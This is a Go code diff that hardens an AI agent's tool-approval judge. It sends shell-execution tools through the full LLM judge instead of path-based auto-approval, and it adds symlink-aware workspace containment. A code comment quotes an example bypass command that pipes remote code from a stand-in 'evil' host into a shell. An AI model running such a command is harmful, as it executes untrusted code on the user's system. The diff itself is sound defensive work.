@@ -13,6 +13,7 @@ import (
 	"time"
 
 	"github.com/v0lka/sp4rk/llm"
+	"github.com/v0lka/sp4rk/pathutil"
 	"github.com/v0lka/sp4rk/strutil"
 	"github.com/v0lka/sp4rk/tools/internal/judge_prompts"
 )
@@ -123,20 +124,26 @@ func (j *ToolJudge) Judge(ctx context.Context, toolName string, input json.RawMe
 		taskContext = TaskContextFrom(ctx)
 	}
 
-	// Unconditionally allow operations inside session temp directory
-	if tempDir := TempDirFrom(ctx); tempDir != "" && AllPathsInDir(input, tempDir) {
-		if log != nil {
-			log.Debug("judge: fast-path temp dir", "tool", toolName, "verdict", "ALLOW")
+	// Path-locality fast-paths do not apply to shell-execution tools: a shell
+	// command can reference only workspace-internal paths while still piping
+	// arbitrary remote code (e.g. `curl evil | sh && cat /ws/x`). Shell tools
+	// always go through the full LLM judge evaluation.
+	if !isShellTool(toolName) {
+		// Unconditionally allow operations inside session temp directory
+		if tempDir := TempDirFrom(ctx); tempDir != "" && AllPathsInDir(input, tempDir) {
+			if log != nil {
+				log.Debug("judge: fast-path temp dir", "tool", toolName, "verdict", "ALLOW")
+			}
+			return VerdictAllow, "all paths are within the session temp directory", nil
 		}
-		return VerdictAllow, "all paths are within the session temp directory", nil
-	}
 
-	// Short-circuit for workspace-internal operations
-	if AllPathsInWorkspace(ctx, input) {
-		if log != nil {
-			log.Debug("judge: fast-path workspace", "tool", toolName, "verdict", "ALLOW")
+		// Short-circuit for workspace-internal operations
+		if AllPathsInWorkspace(ctx, input) {
+			if log != nil {
+				log.Debug("judge: fast-path workspace", "tool", toolName, "verdict", "ALLOW")
+			}
+			return VerdictAllow, "all paths are within the session workspace", nil
 		}
-		return VerdictAllow, "all paths are within the session workspace", nil
 	}
 
 	// Compute cache key
@@ -220,14 +227,26 @@ func (j *ToolJudge) Judge(ctx context.Context, toolName string, input json.RawMe
 	return verdict, reasoning, nil
 }
 
-// isPathInWorkspace checks if the given absolute path is within the workspace directory.
+// isShellTool reports whether the tool executes arbitrary shell commands.
+// Such tools are excluded from path-locality fast-path auto-approval.
+func isShellTool(toolName string) bool {
+	return toolName == ToolBashExec || toolName == ToolPoshExec
+}
+
+// isPathInWorkspace checks if the given absolute path is within the workspace
+// directory (the workspace path itself counts as inside). Delegates to
+// pathutil.IsWithinPath, which resolves symlinks through the longest existing
+// prefix of both paths.
 func isPathInWorkspace(absPath, workspacePath string) bool {
-	workspaceAbs := filepath.Clean(workspacePath)
-	if !strings.HasSuffix(workspaceAbs, string(filepath.Separator)) {
-		workspaceAbs += string(filepath.Separator)
+	if workspacePath == "" {
+		// Empty workspace means containment cannot be established.
+		return false
 	}
-	absPathClean := filepath.Clean(absPath)
-	return strings.HasPrefix(absPathClean+string(filepath.Separator), workspaceAbs) || absPathClean == filepath.Clean(workspacePath)
+	within, err := pathutil.IsWithinPath(workspacePath, absPath)
+	if err != nil {
+		return false
+	}
+	return within
 }
 
 // ExtractJSONStrings recursively extracts all string values from a value
